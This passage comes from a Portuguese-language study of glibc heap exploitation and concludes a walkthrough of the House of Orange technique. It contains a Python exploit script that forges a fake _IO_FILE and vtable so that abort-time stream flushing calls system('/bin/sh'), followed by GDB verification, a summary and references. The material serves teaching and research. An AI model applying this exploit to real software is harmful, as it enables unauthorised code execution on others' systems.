  <li>Seguindo as alterações para que o passo anterior passe pelas checagens durante o <em>unsortedbin attack</em> precisamos seguir a estrutura dos <em>file streams</em> vistas anteriormente e configurar nosso <code class="language-plaintext highlighter-rouge">write_base</code> para ser menor que o <code class="language-plaintext highlighter-rouge">write_ptr</code>.</li>
  <li>O campo <code class="language-plaintext highlighter-rouge">_mode</code> precisa ser menor ou igual a zero. Agora a checagem irá passar e a entrada da <code class="language-plaintext highlighter-rouge">overflow()</code> na <em>vtable</em> deste <em>file stream</em> será chamada.</li>
  <li>Teoricamente podemos apontar a <em>vtable</em> para qualquer lugar onde temos controle da memória, portanto, vamos inserí-lo no meio da própria <em>heap</em> mais específicamente em <code class="language-plaintext highlighter-rouge">heap + 0xd8</code>, onde os dados não estão sendo usados pelo <em>file stream</em> falso.</li>
  <li>Precisamos configurar uma entrada para a função <code class="language-plaintext highlighter-rouge">overflow()</code> dentro da nossa <em>vtable</em> falsa. Poderíamos utilizar um <em>one_gadget</em> porém, quando analisamos a estrutura dos <em>file streams</em>, vimos que quando a função <code class="language-plaintext highlighter-rouge">overflow()</code> é chamada, seu primeiro argumento é o endereço do próprio <em>file strem</em> que o chamou, contido no campo <code class="language-plaintext highlighter-rouge">_flags</code>. Isso significa que se escrevermos a <em>string</em> “/bin/sh” no primeiro <em>quadword</em>  do nosso <em>file stream</em> forjado, onde o campo <code class="language-plaintext highlighter-rouge">_flags</code> está, depois configurando o <em>pointer</em> para a <code class="language-plaintext highlighter-rouge">overflow()</code> na função <code class="language-plaintext highlighter-rouge">system()</code> da GLIBC, a chamada vai se tornar <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code> e teremos um <code class="language-plaintext highlighter-rouge">shell</code> sem utilizar o <em>one_gadget</em>.</li>
</ol>

<p>A atualização do script com os passos citados fica desta forma:</p>

<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">#===============EXPLOITING================#
</span>
<span class="c1"># requisitando um small chunk
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o topo chunk size field com 0x90
</span><span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">24</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x1000</span> <span class="o">-</span> <span class="mh">0x20</span> <span class="o">+</span> <span class="mi">1</span><span class="p">))</span>

<span class="c1"># ativando o top chunk extension
</span><span class="n">large_malloc</span><span class="p">()</span>

<span class="c1"># sobrescrevendo o top chunk antigo apontando sua "bk" para forjar uma estrutura _IO_FILE
</span><span class="n">size</span> <span class="o">=</span> <span class="mh">0x61</span>
<span class="n">fd</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">bk</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">_IO_list_all</span> <span class="o">-</span> <span class="mi">16</span>

<span class="n">write_base</span> <span class="o">=</span> <span class="mh">0x01</span>
<span class="n">write_ptr</span> <span class="o">=</span> <span class="mh">0x02</span>
<span class="n">mode</span> <span class="o">=</span> <span class="mh">0x00</span>
<span class="n">vtable_ptr</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0xd8</span>
<span class="n">flags</span> <span class="o">=</span> <span class="sa">b</span><span class="s">"/bin/sh</span><span class="se">\0</span><span class="s">"</span>
<span class="n">overflow</span> <span class="o">=</span> <span class="n">libc</span><span class="p">.</span><span class="n">sym</span><span class="p">.</span><span class="n">system</span>

<span class="c1"># colocando em ordem e montando o _IO_FILE falso
</span><span class="n">fake_file</span> <span class="o">=</span> <span class="n">flags</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">size</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">fd</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="n">bk</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_base</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">write_ptr</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span><span class="o">*</span><span class="mi">18</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">mode</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span>\
        <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">overflow</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">vtable_ptr</span><span class="p">)</span>

<span class="n">edit</span><span class="p">(</span><span class="sa">b</span><span class="s">"A"</span><span class="o">*</span><span class="mi">16</span> <span class="o">+</span> <span class="n">fake_file</span><span class="p">)</span>

<span class="c1"># ativando os passos
</span><span class="n">small_malloc</span><span class="p">()</span>

<span class="c1">#=========================================#
</span></code></pre></div></div>
<p>Com as atualizações feitas, podemos checar todas as chamadas ao executar o script com as opções do GDB.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_268.png" alt="GDB parado" /></p>

<p>Conforme podemos ver no painel <em>backtrace</em>, o GDB parou novamente na chamada <code class="language-plaintext highlighter-rouge">malloc_printerr()</code> seguido da função <code class="language-plaintext highlighter-rouge">abort()</code>. Mas se olharmos para <em>frame</em> atual, veremos que o programa parou na função <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code>, exatamente a função que queriamos ativar.</p>

<p>Sabemos exatamente o que esta função irá fazer, podemos seguir seu fluxo verificando o conteúdo da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> com o comando <code class="language-plaintext highlighter-rouge">print</code>, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_269.png" alt="_chain" /></p>

<p>Conforme podemos ver, circulado em vermelho, o campo <code class="language-plaintext highlighter-rouge">_chain</code> agora aponta para a <em>heap</em> ao invés de apontar para a <em>main arena</em>.</p>

<p>Podemos seguir o fluxo do campo <code class="language-plaintext highlighter-rouge">_chain</code> e ver o conteúdo do nosso <em>file stream</em> falso conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_270.png" alt="campos da _chain" /></p>

<p>Conforme vemos, os campos <code class="language-plaintext highlighter-rouge">_IO_write_base</code> e <code class="language-plaintext highlighter-rouge">_IO_write_ptr</code> estão com os valores <code class="language-plaintext highlighter-rouge">0x1</code> e <code class="language-plaintext highlighter-rouge">0x2</code> respectivamente, conforme programamos em nosso script, e também o campo <code class="language-plaintext highlighter-rouge">_mode</code> com o valor zero.</p>

<p>Também podemos consultar a <em>vtable</em> para qual nosso <em>file stream</em> aponta, conforme abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_271.png" alt="overflow() sobrescrita" /></p>

<p>A função <code class="language-plaintext highlighter-rouge">overflow()</code> foi sobrescrita com o endereço da <code class="language-plaintext highlighter-rouge">system()</code>, conforme programamos.<br />
Se seguirmos o campo <code class="language-plaintext highlighter-rouge">_flags</code> da estrutura da <code class="language-plaintext highlighter-rouge">_chain</code>, veremos que esta contém a <em>string</em> “/bin/sh”, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_272.png" alt="_flags sobrescrita_" /></p>

<p>Neste ponto, podemos continuar a execução no GDB e voltar para a tela do script, onde, mesmo com várias mensagens de erro, teremos um <code class="language-plaintext highlighter-rouge">shell</code>, conforme mostrado abaixo.</p>

<p><img src="/img/papers/heap_p1/paper_heap1_273.png" alt="shell obtido" /></p>

<p>E esta é a técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>.</p>

<blockquote>
  <p>Em resumo, nos aproveitamos de um <em>bug</em> de <em>overflow</em> para diminuir o tamanho do <em>top chunk size field</em> para o menor tamanho possível alinhado com o tamanho de uma <em>page</em>. Depois, fizemos uma requisição muito grande para caber no <em>chunk</em> reduzido.<br />
Isto ativou o código de extenção de <em>top chunk</em> da malloc, que requisita mais memória do kernel. Porém como nós adulteramos o <em>top chunk size field</em>, na perspectiva da malloc, o novo <em>top chunk</em> criado não estava adjacente ao <em>top chunk</em> antigo, fazendo com que a malloc liberasse o <em>top chunk</em> antigo para a <em>unsortedbin</em>. Isto nos deixou com um <em>chunk unsorted</em> como resultado de nosso <em>overflow</em>.<br />
Nos aproveitamos do <em>bug</em> de <em>overflow</em> uma segunda vez, para sobrescrever o “bk” deste <em>chunk unsorted</em>, preparando um <em>unsortedbin attack</em> contra o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code>.<br />
Também nos aproveitamos desta oportunidade para forjar um <em>file stream</em> na <em>heap</em>, sobrepondo o <em>top chunk</em> antigo e configurar seu tamanho para <code class="language-plaintext highlighter-rouge">0x60</code> bytes.<br />
Então fizemos uma terceira requisição final para um <em>chunk</em> que não tinha o tamanho de <code class="language-plaintext highlighter-rouge">0x20</code> bytes. A malloc, como não encontrou um <em>chunk</em> com este tamanho nem na lista <em>fast</em> e nem na lista <em>small</em>, começou a procurar na lista <em>unsortedbin</em>, onde encontrou o <em>top chunk</em> antigo. Como o <em>top chunk</em> antigo tinha <code class="language-plaintext highlighter-rouge">0x60</code> bytes de tamanho e também não se encaixava na solicitação, a malloc iniciou o processo de <em>partial unlink</em> ativando o <em>unsortedbin attack</em>.<br />
A malloc então continuou sua busca, seguindo agora o “bk” corrompido que criamos para um <em>chunk</em>  que não existe falhando no processo de checagem, forçando a GLIBC a iniciar o procedimento de abortagem.<br />
Antes de iniciar o procedimento de abortagem, a GLIBC tentou limpar todos os <em>file streams</em> abertos. Ela começou seguindo o <em>pointer</em> da <code class="language-plaintext highlighter-rouge">_IO_list_all</code> corrompido que criamos que levava até a <em>main arena</em>, o <em>pointer</em> que havia sido submetido ao <em>unsortedbin attack</em> e agora continha o endereço da <em>unsortedbin</em> na <em>main arena</em>.<br />
Como a <em>main arena</em> foi considerada como um <em>file stream</em>, a checagem de integridade falhou ao chamar a função <code class="language-plaintext highlighter-rouge">overflow()</code> fazendo com que a função de checagem <code class="language-plaintext highlighter-rouge">_IO_flush_all_lockp()</code> se movesse para o próximo <em>file stream</em> na lista, seguindo o <em>pointer</em> do campo <code class="language-plaintext highlighter-rouge">_chain</code>.<br />
O <em>pointer</em> contido no campo <code class="language-plaintext highlighter-rouge">_chain</code> sobrepôs o “bk” do <em>smallbin</em> de <code class="language-plaintext highlighter-rouge">0x60</code> bytes, que continha o início de toda esta série de eventos e também continha nosso <em>file stream</em> falso.<br />
Nós construímos este <em>file stream</em> de forma que passasse por todo o processo de checagem sem erros ativando a função <code class="language-plaintext highlighter-rouge">overflow()</code>. Neste ponto, nosso <em>pointer</em> para a <em>vtable</em> foirjada foi seguido, onde substituímos a função <code class="language-plaintext highlighter-rouge">overflow()</code> pelo endereço da <code class="language-plaintext highlighter-rouge">system()</code>.<br />
A função <code class="language-plaintext highlighter-rouge">overflow()</code> é normalmente chamada com um <em>pointer</em> para seu próprio <em>file stream</em> como primeiro argumento no campo <code class="language-plaintext highlighter-rouge">_flags</code>. Nós substituímos o valor do campo <code class="language-plaintext highlighter-rouge">_flags</code> com a <em>string</em> “/bin/sh”.<br />
Isto resultou numa chamada para <code class="language-plaintext highlighter-rouge">overflow()</code> sendo interpretada como <code class="language-plaintext highlighter-rouge">system("/bin/sh")</code>, nos retornando um <code class="language-plaintext highlighter-rouge">shell</code>.</p>
</blockquote>

<p>Este é um exemplo da técnica <code class="language-plaintext highlighter-rouge">The House of Orange</code>, onde exploramos um binário com todas as implementações de segurança padrão foram ativadas.</p>

<h1 id="considerações-finais">CONSIDERAÇÕES FINAIS</h1>

<p>Neste estudo, foram apresentados os princípios da arquitetura de alocação de memória dinâmica e seus objetos, como arenas, listas <em>chunks</em>, alguns de seus processoso como alocação, liberação e desvinculação.</p>

<p>Também foi aprensentado, o princípio, de algumas das técnicas mais primitavas de exploração da memória <em>heap</em>.</p>

<p>Conforme desenvilvido no estudo, fica claro que toda implementação de mitigação, gera uma porção de técnicas diferentes para conseguir seu respectivo <em>bypass</em>.</p>

<p>Além das técnicas apresentadas nesta primeira parte do estudo, existem outras de extrema relevância que serão exploradas subsequentemente em próximas partes do estudo.</p>

<h1 id="referências">REFERÊNCIAS</h1>

<p>ANGELBOY. <strong>HITCON CTF Qual 2016:</strong> House of Orange Write up. ln: Angelboy. <strong>4ngelboy</strong>. EUA, 12 dez. 2016. Disponível em: <a href="https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html" title="HITCON CTF Qual 2016">https://4ngelboy.blogspot.com/2016/10/hitcon-ctf-qual-2016-house-of-orange.html</a>. Acesso em: 13 abr. 2022.</p>

<p>Anônimo. <strong>Once upon a free()</strong>. [S. l.], 2001. Disponível em: <a href="http://phrack.org/issues/57/9.html" title="Once upon a free()">http://phrack.org/issues/57/9.html</a>. Acesso em: 06 abr. 2022.</p>

<p>GCC. <strong>ABI Policy and Guidelines</strong>. [S. l.], 2022. Disponível em: <a href="https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html" title="ABI Policy and Guidelines">https://gcc.gnu.org/onlinedocs/libstdc++/manual/abi.html</a>. Acesso em: 06 abr. 2022.</p>

<p>GNU. <strong>GNU C Library</strong>. [S. l.], 2022. Disponível em: <a href="https://gnu.org/software/libc/" title="GNU C Library">https://gnu.org/software/libc/</a>. Acesso em: 06 abr. 2022.</p>

<p>JP. <strong>Advanced Doug Lea’s malloc exploits</strong>. [S. l.], 2003. Disponível em: <a href="http://phrack.org/issues/61/6.html" title="Advanced Doug Lea's malloc exploits">http://phrack.org/issues/61/6.html</a>. Acesso em: 06 abr. 2022.</p>

<p>K-sPecial. <strong>The House of Mind</strong>. [S. l.], 2007. Disponível em: <a href="http://www.exploit-db.com/papers/13112" title="The House of Mind">www.exploit-db.com/papers/13112</a>. Acesso em: 06 abr. 2022.</p>

<p>KAMPER, Max. <strong>HeapLab:</strong> GLIBC Heap Exploitation Bible. EUA: HeapLab, v. a, 2021.</p>

<p>Maxx. <strong>Vudo malloc tricks</strong>. [S. l.], 2001. Disponível em: <a href="http://phrack.org/issues/57/8.html" title="Vudo malloc tricks">http://phrack.org/issues/57/9.html</a>. Acesso em: 06 abr. 2022.</p>

<p>N1570: ISO/IEC 9899:201x. C11. EUA: Committee Draft, 2011. Programming languages – C. Disponível em: <a href="https://port70.net/~nsz/c/c11/n1570.html">port70.net/~nsz/c/c11/n1570.html</a>. Acesso em: 06 abr. 2022.</p>

<p><strong>ONE</strong>, Aleph. <strong>Smashing The Stack For Fun And Profit</strong>. [S. l.], 1997. Disponível em: <a href="http://phrack.org/issues/49/14.html" title="Smashing The Stack For Fun And Profit">http://phrack.org/issues/49/14.html</a>. Acesso em: 06 abr. 2022.</p>

<p>PHANTASMAGORIA, Phantasmal. <strong>Malloc Maleficarum</strong>. [S. l.], 2005. Disponível em: <a href="https://repository.root-me.org/Exploitation%20-%20Syst%C3%A8me/Unix/EN%20-%20Heap%20Bug%20-%20Exploiting%20the%20wilderness%20-%20Phantasmal%20Phantasmagoria.txt" title="Malloc Maleficarum">repository.root-me.org/</a>. Acesso em: 06 abr. 2022.</p>

